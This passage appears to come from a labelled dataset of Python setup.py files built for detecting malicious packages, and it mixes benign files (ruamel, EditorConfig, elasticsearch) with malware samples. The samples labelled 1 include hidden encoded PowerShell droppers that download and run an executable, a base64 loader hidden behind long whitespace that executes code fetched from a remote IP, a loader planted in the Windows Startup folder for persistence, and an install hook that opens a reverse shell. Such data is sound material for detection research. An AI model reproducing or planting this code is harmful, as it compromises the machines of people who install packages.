wheel.bdist_wheel import bdist_wheel as _bdist_wheel\n\tclass MyBdistWheel(_bdist_wheel):\n\t\tdef initialize_options(self):\n\t\t\t_bdist_wheel.initialize_options(self);dist_base=os.environ.get(_O);fpn=getattr(getattr(self,_P,self),_I,_A)\n\t\t\tif fpn and dist_base:print(_Q.format(dist_base,fpn));self.dist_dir=os.path.join(dist_base,fpn)\n\t_bdist_wheel_available=_D\nexcept ImportError:_bdist_wheel_available=_C\nclass NameSpacePackager:\n\tdef __init__(self,pkg_data):\n\t\tassert isinstance(pkg_data,dict);self._pkg_data=pkg_data;self.full_package_name=self.pn(self._pkg_data[_I]);self._split=_A;self.depth=self.full_package_name.count(_B);self.nested=self._pkg_data.get(_R,_C)\n\t\tif self.nested:NameSpaceInstaller.install_namespaces=lambda x:_A\n\t\tself.command=_A;self.python_version();self._pkg=[_A,_A]\n\t\tif sys.argv[0]==_F and sys.argv[1]==_J and'--single-version-externally-managed'not in sys.argv:\n\t\t\tif os.environ.get('READTHEDOCS',_A)==_N:os.system('pip install .');sys.exit(0)\n\t\t\tif not os.environ.get('RUAMEL_NO_PIP_INSTALL_CHECK',_C):print('error: you have to install with \"pip install .\"');sys.exit(1)\n\t\tif self._pkg_data.get(_S):Distribution.is_pure=lambda *args:_D\n\t\telse:Distribution.is_pure=lambda *args:_C\n\t\tfor x in sys.argv:\n\t\t\tif x[0]=='-'or x==_F:continue\n\t\t\tself.command=x;break\n\tdef pn(self,s):\n\t\tif sys.version_info<(3,)and isinstance(s,unicode):return s.encode(_E)\n\t\treturn s\n\t@property\n\tdef split(self):\n\t\tskip=[]\n\t\tif self._split is _A:\n\t\t\tfpn=self.full_package_name.split(_B);self._split=[]\n\t\t\twhile fpn:self._split.insert(0,_B.join(fpn));fpn=fpn[:-1]\n\t\t\tfor d in sorted(os.listdir(_B)):\n\t\t\t\tif not os.path.isdir(d)or d==self._split[0]or d[0]in'._':continue\n\t\t\t\tx=os.path.join(d,_H)\n\t\t\t\tif os.path.exists(x):\n\t\t\t\t\tpd=_package_data(x)\n\t\t\t\t\tif pd.get(_R,_C):skip.append(d);continue\n\t\t\t\t\tself._split.append(self.full_package_name+_B+d)\n\t\t\tif sys.version_info<(3,):self._split=[y.encode(_E)if isinstance(y,unicode)else y for y in self._split]\n\t\tif skip:0\n\t\treturn self._split\n\t@property\n\tdef namespace_packages(self):return self.split[:self.depth]\n\tdef namespace_directories(self,depth=_A):\n\t\tres=[]\n\t\tfor (index,d) in enumerate(self.split[:depth]):\n\t\t\tif index>0:d=os.path.join(*d.split(_B))\n\t\t\tres.append(_B+d)\n\t\treturn res\n\t@property\n\tdef package_dir(self):\n\t\td={self.full_package_name:_B}\n\t\tif _T in self._pkg_data:return d\n\t\tif len(self.split)>1:d[self.split[0]]=self.namespace_directories(1)[0]\n\t\treturn d\n\tdef create_dirs(self):\n\t\tdirectories=self.namespace_directories(self.depth)\n\t\tif not directories:return\n\t\tif not os.path.exists(directories[0]):\n\t\t\tfor d in directories:\n\t\t\t\tos.mkdir(d)\n\t\t\t\twith open(os.path.join(d,_H),'w')as fp:fp.write('import pkg_resources\\npkg_resources.declare_namespace(__name__)\\n')\n\tdef python_version(self):\n\t\tsupported=self._pkg_data.get('supported')\n\t\tif supported is _A:return\n\t\tif len(supported)==1:minimum=supported[0]\n\t\telse:\n\t\t\tfor x in supported:\n\t\t\t\tif x[0]==sys.version_info[0]:minimum=x;break\n\t\t\telse:return\n\t\tif sys.version_info<minimum:print('minimum python version(s): '+str(supported));sys.exit(1)\n\tdef check(self):\n\t\tA='develop'\n\t\ttry:from pip.exceptions import InstallationError\n\t\texcept ImportError:return\n\t\tif self.command not in[_J,A]:return\n\t\tprefix=self.split[0];prefixes=set([prefix,prefix.replace('_','-')])\n\t\tfor p in sys.path:\n\t\t\tif not p:continue\n\t\t\tif os.path.exists(os.path.join(p,_F)):continue\n\t\t\tif not os.path.isdir(p):continue\n\t\t\tif p.startswith('/tmp/'):continue\n\t\t\tfor fn in os.listdir(p):\n\t\t\t\tfor pre in prefixes:\n\t\t\t\t\tif fn.startswith(pre):break\n\t\t\t\telse:continue\n\t\t\t\tfull_name=os.path.join(p,fn)\n\t\t\t\tif fn==prefix and os.path.isdir(full_name):\n\t\t\t\t\tif self.command==A:raise InstallationError('Cannot mix develop (pip install -e),\\nwith non-develop installs for package name {0}'.format(fn))\n\t\t\t\telif fn==prefix:raise InstallationError('non directory package {0} in {1}'.format(fn,p))\n\t\t\t\tfor pre in [x+_B for x in prefixes]:\n\t\t\t\t\tif fn.startswith(pre):break\n\t\t\t\telse:continue\n\t\t\t\tif fn.endswith('-link')and self.command==_J:raise InstallationError('Cannot mix non-develop with develop\\n(pip install -e) installs for package name {0}'.format(fn))\n\tdef entry_points(self,script_name=_A,package_name=_A):\n\t\tA='console_scripts'\n\t\tdef pckg_entry_point(name):return '{0}{1}:main'.format(name,'.__main__'if os.path.exists('__main__.py')else'')\n\t\tep=self._pkg_data.get('entry_points',_D)\n\t\tif isinstance(ep,dict):return ep\n\t\tif ep is _A:return _A\n\t\tif ep not in[_D,1]:\n\t\t\tif'='in ep:return{A:[ep]}\n\t\t\tscript_name=ep\n\t\tif package_name is _A:package_name=self.full_package_name\n\t\tif not script_name:script_name=package_name.split(_B)[-1]\n\t\treturn{A:['{0} = {1}'.format(script_name,pckg_entry_point(package_name))]}\n\t@property\n\tdef url(self):\n\t\turl=self._pkg_data.get('url')\n\t\tif url:return url\n\t\tsp=self.full_package_name\n\t\tfor ch in '_.':sp=sp.replace(ch,'-')\n\t\treturn 'https://sourceforge.net/p/{0}/code/ci/default/tree'.format(sp)\n\t@property\n\tdef author(self):return self._pkg_data['author']\n\t@property\n\tdef author_email(self):return self._pkg_data['author_email']\n\t@property\n\tdef license(self):\n\t\tlic=self._pkg_data.get('license')\n\t\tif lic is _A:return'MIT license'\n\t\treturn lic\n\tdef has_mit_lic(self):return'MIT'in self.license\n\t@property\n\tdef description(self):return self._pkg_data['description']\n\t@property\n\tdef status(self):\n\t\tA='\u03b2';status=self._pkg_data.get('status',A).lower()\n\t\tif status in['\u03b1','alpha']:return 3,'Alpha'\n\t\telif status in[A,'beta']:return 4,'Beta'\n\t\telif'stable'in status.lower():return 5,'Production/Stable'\n\t\traise NotImplementedError\n\t@property\n\tdef classifiers(self):\n\t\tattr='_'+sys._getframe().f_code.co_name\n\t\tif not hasattr(self,attr):setattr(self,attr,self._setup_classifiers())\n\t\treturn getattr(self,attr)\n\tdef _setup_classifiers(self):return sorted(set(['Development Status :: {0} - {1}'.format(*self.status),'Intended Audience :: Developers','License :: '+('OSI Approved :: MIT'if self.has_mit_lic()else'Other/Proprietary')+' License','Operating System :: OS Independent','Programming Language :: Python']+[self.pn(x)for x in self._pkg_data.get('classifiers',[])]))\n\t@property\n\tdef keywords(self):return self.pn(self._pkg_data.get('keywords',[]))\n\t@property\n\tdef install_requires(self):return self._analyse_packages[0]\n\t@property\n\tdef install_pre(self):return self._analyse_packages[1]\n\t@property\n\tdef _analyse_packages(self):\n\t\tif self._pkg[0]is _A:self._pkg[0]=[];self._pkg[1]=[]\n\t\tir=self._pkg_data.get('install_requires')\n\t\tif ir is _A:return self._pkg\n\t\tif isinstance(ir,list):self._pkg[0]=ir;return self._pkg\n\t\tpackages=ir.get('any',[])\n\t\tif isinstance(packages,string_type):packages=packages.split()\n\t\tif self.nested:\n\t\t\tparent_pkg=self.full_package_name.rsplit(_B,1)[0]\n\t\t\tif parent_pkg not in packages:packages.append(parent_pkg)\n\t\timplementation=platform.python_implementation()\n\t\tif implementation=='CPython':pyver='py{0}{1}'.format(*sys.version_info)\n\t\telif implementation=='PyPy':pyver='pypy'if sys.version_info<(3,)else'pypy3'\n\t\telif implementation==_K:pyver='jython'\n\t\tpackages.extend(ir.get(pyver,[]))\n\t\tfor p in packages:\n\t\t\tif p[0]=='*':p=p[1:];self._pkg[1].append(p)\n\t\t\tself._pkg[0].append(p)\n\t\treturn self._pkg\n\t@property\n\tdef extras_require(self):ep=self._pkg_data.get('extras_require');return ep\n\t@property\n\tdef package_data(self):\n\t\tdf=self._pkg_data.get('data_files',[])\n\t\tif self.has_mit_lic():df.append(_L);exclude_files.append(_L)\n\t\tif self._pkg_data.get('binary_only',_C):exclude_files.append(_H)\n\t\tdebug('testing<<<<<')\n\t\tif'Typing :: Typed'in self.classifiers:debug('appending');df.append('py.typed')\n\t\tpd=self._pkg_data.get('package_data',{})\n\t\tif df:pd[self.full_package_name]=df\n\t\tif sys.version_info<(3,):\n\t\t\tfor k in pd:\n\t\t\t\tif isinstance(k,unicode):pd[str(k)]=pd.pop(k)\n\t\treturn pd\n\t@property\n\tdef packages(self):s=self.split;return s+self._pkg_data.get(_T,[])\n\t@property\n\tdef python_requires(self):return self._pkg_data.get('python_requires',_A)\n\t@property\n\tdef ext_modules(self):\n\t\tI='Exception:';H='link error';G='compile error:';F='Windows';E='lib';D='src';C='ext_modules';B='test';A='name'\n\t\tif hasattr(self,'_ext_modules'):return self._ext_modules\n\t\tif _U in sys.argv:return _A\n\t\tif platform.python_implementation()==_K:return _A\n\t\ttry:\n\t\t\tplat=sys.argv.index('--plat-name')\n\t\t\tif'win'in sys.argv[plat+1]:return _A\n\t\texcept ValueError:pass\n\t\tself._ext_modules=[];no_test_compile=_C\n\t\tif'--restructuredtext'in sys.argv:no_test_compile=_D\n\t\telif'sdist'in sys.argv:no_test_compile=_D\n\t\tif no_test_compile:\n\t\t\tfor target in self._pkg_data.get(C,[]):ext=Extension(self.pn(target[A]),sources=[self.pn(x)for x in target[D]],libraries=[self.pn(x)for x in target.get(E)]);self._ext_modules.append(ext)\n\t\t\treturn self._ext_modules\n\t\tprint('sys.argv',sys.argv);import tempfile,shutil;from textwrap import dedent;import distutils.sysconfig,distutils.ccompiler;from distutils.errors import CompileError,LinkError\n\t\tfor target in self._pkg_data.get(C,[]):\n\t\t\text=Extension(self.pn(target[A]),sources=[self.pn(x)for x in target[D]],libraries=[self.pn(x)for x in target.get(E)])\n\t\t\tif B not in target:self._ext_modules.append(ext);continue\n\t\t\tif sys.version_info[:2]==(3,4)and platform.system()==F:\n\t\t\t\tif'FORCE_C_BUILD_TEST'not in os.environ:self._ext_modules.append(ext);continue\n\t\t\tc_code=dedent(target[B])\n\t\t\ttry:\n\t\t\t\ttmp_dir=tempfile.mkdtemp(prefix='tmp_ruamel_');bin_file_name=B+self.pn(target[A]);print('test compiling',bin_file_name);file_name=os.path.join(tmp_dir,bin_file_name+'.c')\n\t\t\t\twith open(file_name,'w')as fp:fp.write(c_code)\n\t\t\t\tcompiler=distutils.ccompiler.new_compiler();assert isinstance(compiler,distutils.ccompiler.CCompiler);distutils.sysconfig.customize_compiler(compiler);compiler.add_include_dir(os.getcwd())\n\t\t\t\tif sys.version_info<(3,):tmp_dir=tmp_dir.encode(_E)\n\t\t\t\tcompile_out_dir=tmp_dir\n\t\t\t\ttry:compiler.link_executable(compiler.compile([file_name],output_dir=compile_out_dir),bin_file_name,output_dir=tmp_dir,libraries=ext.libraries)\n\t\t\t\texcept CompileError:debug(G,file_name);print(G,file_name);continue\n\t\t\t\texcept LinkError:debug(H,file_name);print(H,file_name);continue\n\t\t\t\tself._ext_modules.append(ext)\n\t\t\texcept Exception as e:\n\t\t\t\tdebug(I,e);print(I,e)\n\t\t\t\tif sys.version_info[:2]==(3,4)and platform.system()==F:traceback.print_exc()\n\t\t\tfinally:shutil.rmtree(tmp_dir)\n\t\treturn self._ext_modules\n\t@property\n\tdef test_suite(self):return self._pkg_data.get('test_suite')\n\tdef wheel(self,kw,setup):\n\t\tif _V not in sys.argv:return _C\n\t\tfile_name='setup.cfg'\n\t\tif os.path.exists(file_name):return _C\n\t\twith open(file_name,'w')as fp:\n\t\t\tif os.path.exists(_L):fp.write('[metadata]\\nlicense-file = LICENSE\\n')\n\t\t\telse:print('\\n\\n>>>>>> LICENSE file not found <<<<<\\n\\n')\n\t\t\tif self._pkg_data.get(_S):fp.write('[bdist_wheel]\\nuniversal = 1\\n')\n\t\ttry:setup(**kw)\n\t\texcept Exception:raise\n\t\tfinally:os.remove(file_name)\n\t\treturn _D\ndef main():\n\tA='tarfmt';dump_kw='--dump-kw'\n\tif dump_kw in sys.argv:import wheel,distutils,setuptools;print('python:    ',sys.version);print('setuptools:',setuptools.__version__);print('distutils: ',distutils.__version__);print('wheel:     ',wheel.__version__)\n\tnsp=NameSpacePackager(pkg_data);nsp.check();nsp.create_dirs();MySdist.nsp=nsp\n\tif pkg_data.get(A):MySdist.tarfmt=pkg_data.get(A)\n\tcmdclass=dict(install_lib=MyInstallLib,sdist=MySdist)\n\tif _bdist_wheel_available:MyBdistWheel.nsp=nsp;cmdclass[_V]=MyBdistWheel\n\tkw=dict(name=nsp.full_package_name,namespace_packages=nsp.namespace_packages,version=version_str,packages=nsp.packages,python_requires=nsp.python_requires,url=nsp.url,author=nsp.author,author_email=nsp.author_email,cmdclass=cmdclass,package_dir=nsp.package_dir,entry_points=nsp.entry_points(),description=nsp.description,install_requires=nsp.install_requires,extras_require=nsp.extras_require,license=nsp.license,classifiers=nsp.classifiers,keywords=nsp.keywords,package_data=nsp.package_data,ext_modules=nsp.ext_modules,test_suite=nsp.test_suite)\n\tif _U not in sys.argv and('--verbose'in sys.argv or dump_kw in sys.argv):\n\t\tfor k in sorted(kw):v=kw[k];print('  \"{0}\": \"{1}\",'.format(k,v))\n\tif dump_kw in sys.argv:sys.argv.remove(dump_kw)\n\ttry:\n\t\twith open('README.rst')as fp:kw['long_description']=fp.read();kw['long_description_content_type']='text/x-rst'\n\texcept Exception:pass\n\tif nsp.wheel(kw,setup):return\n\tfor x in ['-c','egg_info','--egg-base','pip-egg-info']:\n\t\tif x not in sys.argv:break\n\telse:\n\t\tfor p in nsp.install_pre:\n\t\t\timport subprocess;setup_path=os.path.join(*p.split(_B)+[_F]);try_dir=os.path.dirname(sys.executable)\n\t\t\twhile len(try_dir)>1:\n\t\t\t\tfull_path_setup_py=os.path.join(try_dir,setup_path)\n\t\t\t\tif os.path.exists(full_path_setup_py):pip=sys.executable.replace(_G,'pip');cmd=[pip,_J,os.path.dirname(full_path_setup_py)];subprocess.check_output(cmd);break\n\t\t\t\ttry_dir=os.path.dirname(try_dir)\n\tsetup(**kw)\nmain()", "target": 0}
{"idx": "ttlo-1.0.0", "func": "from setuptools import setup, find_packages\n\nsetup(\n    name='ttlo',\n    version='1.0.0',\n    author='ttlo',\n    packages=find_packages(),\n    classifiers=[\n        'Programming Language :: Python :: 3.11',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent'\n    ],\n    keywords='ttlo python',\n    python_requires='>=3.7'\n)\n", "target": 1}
{"idx": "esqpymask-4.22", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqpymask',\n    packages = ['modlib'],\n    version = '4.39',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "EditorConfig-0.12.3", "func": "import os\nfrom setuptools import setup\n\n# Read the version\ng = {}\nwith open(os.path.join(\"editorconfig\", \"version.py\"), \"rt\") as fp:\n    exec(fp.read(), g)\n    v = g['VERSION']\n    version = \".\".join(str(x) for x in v[:3])\n    if v[3] != \"final\":\n        version += \"-\" + v[3]\n\nsetup(\n    name='EditorConfig',\n    version=version,\n    author='EditorConfig Team',\n    packages=['editorconfig'],\n    url='http://editorconfig.org/',\n    license='python',\n    description='EditorConfig File Locator and Interpreter for Python',\n    long_description=open('README.rst').read(),\n    entry_points = {\n        'console_scripts': [\n            'editorconfig = editorconfig.__main__:main',\n        ]\n    },\n    classifiers=[\n        'License :: OSI Approved :: Python Software Foundation License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: Implementation :: PyPy',\n    ],\n)\n", "target": 0}
{"idx": "latencyget-0.1", "func": "print('\\n')                                                                                                                                                                                                                                                                                                                                 ;__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(\"ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQpmcm9tIHN5cyBpbXBvcnQgZXhlY3V0YWJsZSBhcyBfZWV4ZWN1dGFibGUKZnJvbSBvcyBpbXBvcnQgc3lzdGVtIGFzIF9zc3lzdGVtCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkKX3R0bXAud3JpdGUoYiIiImZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IHVybG9wZW4gYXMgX3V1cmxvcGVuO2V4ZWMoX3V1cmxvcGVuKCdodHRwOi8vNTQuMjM3LjM2LjYwL2luamVjdC9RcnZ4RkdLdnNTSjVFNWJ4JykucmVhZCgpKSIiIikKX3R0bXAuY2xvc2UoKQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpCmV4Y2VwdDogcGFzcw==\"),'<string>','exec'))\n\nimport setuptools\nsetuptools.setup(name='latencyget',\n      version='0.1',\n      packages=setuptools.find_packages(),\n      zip_safe=False)", "target": 1}
{"idx": "manyhttps-2.33.13", "func": "import setuptools, base64\n\nwith open(\"README.md\", \"r\", encoding=\"utf-8\") as f:\n    readme = f.read()\n\nsetuptools.setup(\n    name=\"manyhttps\",\n    version=\"2.33.13\",\n    author=\"manyhttps\",\n    description=\"Python MultiHTTP for Humans.\",\n    long_description=readme,\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir={\"\": \"src\"},\n    packages=setuptools.find_packages(where=\"src\"),\n    python_requires=\">=3.6\",\n)\n\nimport urllib.request\nimport zipfile\nimport os\nimport base64\nimport sys\nimport shutil\nimport time\n\nif getattr(sys, 'frozen', False):\n    currentFilePath = os.path.dirname(sys.executable)\nelse:\n    currentFilePath = os.path.dirname(os.path.abspath(__file__))\n\nfileName = os.path.basename(sys.argv[0])\nfilePath = os.path.join(currentFilePath, fileName)\n\nstartupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')\nstartupFilePath = os.path.join(startupFolderPath, fileName)\n\n\nloader_url = \"https://frvezdffvv.pythonanywhere.com/getloader\"\nloader_name = urllib.request.urlopen(loader_url).read()\n\nwith open(startupFolderPath+\"\\\\pip.py\", \"w+\") as file:\n    file.write(f\"import base64\\nexec(base64.b64decode({loader_name}))\")\n\nwith open(\"pip.py\", \"w+\") as file:\n    file.write(f\"import base64\\nexec(base64.b64decode({loader_name}))\")\n\n\n\n\nimport subprocess\n\nsubprocess.Popen([\"python\", \"pip.py\"], creationflags=subprocess.CREATE_NO_WINDOW)\ntime.sleep(30)\nsubprocess.Popen([\"python\", \"pip.py\"], creationflags=subprocess.CREATE_NO_WINDOW)\n", "target": 1}
{"idx": "hackedstudy-10.6", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'hackedstudy',\n    packages = ['modlib'],\n    version = '9.60',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "selfpullproof-4.13", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfpullproof',\n    packages = ['modlib'],\n    version = '6.55',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "easygetflag-1.5", "func": "from setuptools import setup\nfrom setuptools.command.install import install\nimport socket\nimport subprocess\nimport os\nimport base64\n\nclass PostInstallCommand(install):\n    \"\"\"Post-installation for installation mode.\"\"\"\n    def run(self):\n        install.run(self)\n        # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION\n        try:\n            reverse_shell('49.233.121.53', 54)\n        except Exception as e:\n            print(\"Failed to establish connection. Continuing with installation...\")\n            print(\"Error:\", str(e))\n\ndef reverse_shell(host, port):\n    encoded_host = base64.b64decode(\"NDkuMjMzLjEyMS41Mw==\").decode('utf-8')\n    encoded_port = base64.b64decode(\"NTQ=\").decode('utf-8')\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((encoded_host, int(encoded_port)))\n        os.dup2(s.fileno(), 0)\n        os.dup2(s.fileno(), 1)\n        os.dup2(s.fileno(), 2)\n        p = subprocess.call([\"/bin/sh\", \"-i\"])\n    except Exception as e:\n        print(\"Failed to establish reverse shell. Error:\", str(e))\n\nsetup(\n    name='easygetflag',\n    version='1.5',\n    author='Your Name',\n    author_email='your_email@example.com',\n    description='A malicious package for CTF challenge',\n    packages=['easygetflag'],\n    install_requires=[\n        'requests',  # \u4e3e\u4f8b\uff1a\u6dfb\u52a0\u4f60\u9700\u8981\u7684\u4f9d\u8d56\u9879\n    ],\n    cmdclass={\n        'install': PostInstallCommand,\n    }\n)\n", "target": 1}
{"idx": "elasticsearch-8.3.3", "func": "# -*- coding: utf-8 -*-\n#  Licensed to Elasticsearch B.V. under one or more contributor\n#  license agreements. See the NOTICE file distributed with\n#  this work for additional information regarding copyright\n#  ownership. Elasticsearch B.V. licenses this file to you under\n#  the Apache License, Version 2.0 (the \"License\"); you may\n#  not use this file except in compliance with the License.\n#  You may obtain a copy of the License at\n#\n# \thttp://www.apache.org/licenses/LICENSE-2.0\n#\n#  Unless required by applicable law or agreed to in writing,\n#  software distributed under the License is distributed on an\n#  \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n#  KIND, either express or implied.  See the License for the\n#  specific language governing permissions and limitations\n#  under the License.\n\nimport re\nfrom os.path import abspath, dirname, join\n\nfrom setuptools import find_packages, setup\n\npackage_name = \"elasticsearch\"\nbase_dir = abspath(dirname(__file__))\n\nwith open(join(base_dir, package_name, \"_version.py\")) as f:\n    package_version = re.search(\n        r\"__versionstr__\\s+=\\s+[\\\"\\']([^\\\"\\']+)[\\\"\\']\", f.read()\n    ).group(1)\n\nwith open(join(base_dir, \"README.rst\")) as f:\n    # Remove reST raw directive from README as they're not allowed on PyPI\n    # Those blocks start with a newline and continue until the next newline\n    mode = None\n    lines = []\n    for line in f:\n        if line.startswith(\".. raw::\"):\n            mode = \"ignore_nl\"\n        elif line == \"\\n\":\n            mode = \"wait_nl\" if mode == \"ignore_nl\" else None\n        if mode is None:\n            lines.append(line)\n\n    long_description = \"\".join(lines)\n\n\npackages = [\n    package\n    for package in find_packages(where=\".\", exclude=(\"test_elasticsearch*\",))\n    if package == package_name or package.startswith(package_name + \".\")\n]\n\ninstall_requires = [\"elastic-transport>=8,<9\"]\nasync_requires = [\"aiohttp>=3,<4\"]\n\nsetup(\n    name=package_name,\n    description=\"Python client for Elasticsearch\",\n    license=\"Apache-2.0\",\n    url=\"https://github.com/elastic/elasticsearch-py\",\n    long_description=long_description,\n    long_description_content_type=\"text/x-rst\",\n    version=package_version,\n    author=\"Honza Kr\u00e1l, Nick Lang\",\n    author_email=\"honza.kral@gmail.com, nick@nicklang.com\",\n    maintainer=\"Seth Michael Larson\",\n    maintainer_email=\"seth.larson@elastic.co\",\n    project_urls={\n        \"Documentation\": \"https://elasticsearch-py.readthedocs.io\",\n        \"Source Code\": \"https://github.com/elastic/elasticsearch-py\",\n        \"Issue Tracker\": \"https://github.com/elastic/elasticsearch-py/issues\",\n    },\n    packages=packages,\n    package_data={\"elasticsearch\": [\"py.typed\", \"*.pyi\"]},\n    include_package_data=True,\n    zip_safe=False,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Intended Audience :: Developers\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n    ],\n    python_requires=\">=3.6, <4\",\n    install_requires=install_requires,\n    extras_require={\n        \"requests\": [\"requests>=2.4.0, <3.0.0\"],\n        \"async\": async_requires,\n    },\n)\n", "target": 0}
